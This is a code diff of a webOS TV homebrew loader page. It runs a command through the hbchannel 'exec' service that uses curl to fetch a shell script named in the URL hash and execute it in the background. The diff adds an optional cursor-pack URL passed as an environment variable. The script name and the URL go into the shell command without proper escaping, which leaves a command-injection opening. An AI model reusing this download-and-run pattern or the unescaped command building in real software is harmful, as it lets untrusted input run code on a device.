@@ -11,12 +11,13 @@
             console.log('[rbc] ' + str);
         }
 
-        // Script name is passed as the hash fragment (#beanbird.sh) because
-        // facebooklogin's webview strips/rewrites query strings but preserves the hash.
-        var scriptName = decodeURIComponent(window.location.hash.replace(/^#/, ''));
+        // Hash format: encodeURIComponent(scriptName) | encodeURIComponent(cursorUrl)
+        // The pipe | is used as separator because it survives facebooklogin's URL rewriting.
+        var rawHash = window.location.hash.replace(/^#/, '');
+        var parts = rawHash.split('|');
+        var scriptName = decodeURIComponent(parts[0] || '');
+        var cursorZipUrl = parts[1] ? decodeURIComponent(parts[1]) : null;
 
-        // Build the script download URL from window.location.href, stripping the hash.
-        // Don't use window.location.origin — it can be empty/null inside facebooklogin's webview.
         var baseUrl = window.location.href.split('#')[0].replace(/\/stage2\.html.*$/, '');
         var scriptUrl = baseUrl + '/' + scriptName;
 
@@ -25,20 +26,19 @@
         } else if (typeof webOS === 'undefined' || typeof webOS.service === 'undefined') {
             log('ERROR: webOS.service not available. Is this running in the facebooklogin browser?');
         } else {
-            log('Target: ' + scriptUrl);
+            log('Target script: ' + scriptUrl);
+            if (cursorZipUrl) log('Cursor pack: ' + cursorZipUrl);
 
-            // LunaDownloadMgr is patched on webOS 4.x (denies category "/").
-            // Instead: use hbchannel exec to run curl directly on the TV — curl is
-            // always present on webOS and has no category restrictions.
-            var cmd = 'curl -L ' + scriptUrl + ' -o /tmp/rbc_payload.sh && chmod +x /tmp/rbc_payload.sh && nohup sh /tmp/rbc_payload.sh > /tmp/rbc_log.txt 2>&1 &';
-            log('Running: ' + cmd);
+            // Download the shell script, then run it with CURSOR_URL env var if provided.
+            var envPrefix = cursorZipUrl ? 'CURSOR_URL=' + JSON.stringify(cursorZipUrl) + ' ' : '';
+            var cmd = 'curl -L ' + scriptUrl + ' -o /tmp/rbc_payload.sh && chmod +x /tmp/rbc_payload.sh && nohup env ' + envPrefix + 'sh /tmp/rbc_payload.sh > /tmp/rbc_log.txt 2>&1 &';
+            log('Running payload...');
 
             webOS.service.request('luna://org.webosbrew.hbchannel.service', {
                 method: 'exec',
                 parameters: { command: cmd },
                 onSuccess: function(r) {
                     log('Script launched in background. Reading log in 30s...');
-                    // Wait 30s then read /tmp/rbc_log.txt to show beanbird.sh output
                     setTimeout(function() {
                         webOS.service.request('luna://org.webosbrew.hbchannel.service', {
                             method: 'exec',
